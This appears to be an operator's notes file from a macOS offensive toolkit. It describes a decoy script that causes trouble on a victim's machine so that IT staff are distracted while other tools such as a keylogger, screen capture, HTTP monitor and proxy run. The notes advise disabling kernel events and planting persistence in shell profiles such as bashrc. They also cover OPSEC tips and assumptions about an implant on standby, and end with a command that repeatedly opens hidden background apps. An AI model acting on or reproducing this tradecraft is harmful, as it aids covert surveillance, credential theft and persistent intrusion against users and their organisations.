


#TODO 
 # add to command index
# objective:  get the user to request IT assistance

# Expected outcome
# User will 
- open an IT ticket on JIRA,  service, now, etc
- slack the IT channel
- walk to the user's desk
- if remote: IT may 'RDP' in usin macos built-in remote system mngt 

This decoy script will 
- divert the attention of the IT to resolve thhe issue 
- best to us with other loaded JXA tools such as 

keylogger.js
monitorhttp.js
screencapture.js
smartproxy.js
tty.js

make sure to disable  kernel events 


# TARGET FILES
- ~/.zsh, bashrc,  and any other default profiles used 
- for persistence  procedures,  hit the docs or  checkout the persistence directory
- NOTE: INPUT for the -n arg must  > 5 sec , Else the user is fucked, thhey'll need to
1. boot in safe mode to remove persistence 
-  this is not good for us because  our per tools aren't mounted , so we essentially lose access 

OPSEC
- consider loading apps often used by the user
- use listapps.js , swiftbelt.js  etc. 

ASSUMPTIONS
- operator has per established
- has an implant  on standby, must be launchhed  from a tier 1 persistence procedure
- operator  is using apps with either FDA or automation permissions




screen watch  -t -n 30 'open --hide  --backrgound -a <someApp>:'
